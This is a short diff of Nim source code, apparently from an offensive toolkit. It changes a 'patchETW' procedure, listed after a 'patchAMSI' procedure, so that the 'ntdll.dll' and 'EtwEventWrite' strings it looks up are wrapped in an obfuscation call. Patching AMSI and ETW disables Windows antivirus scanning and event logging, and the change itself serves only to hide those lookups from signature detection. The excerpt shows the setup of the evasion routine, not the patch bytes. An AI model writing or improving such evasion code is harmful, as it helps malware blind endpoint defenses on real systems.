@@ -40,11 +40,11 @@ proc patchAMSI*(): int =
 # Returns: 0=success, 1=error, 2=already patched
 proc patchETW*(): int =
   try:
-    let ntdll = LoadLibraryA("ntdll.dll")
+    let ntdll = LoadLibraryA(obf("ntdll.dll"))
     if ntdll == 0:
       return 1
     
-    let etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite")
+    let etwEventWrite = GetProcAddress(ntdll, obf("EtwEventWrite"))
     if etwEventWrite == nil:
       return 1
     
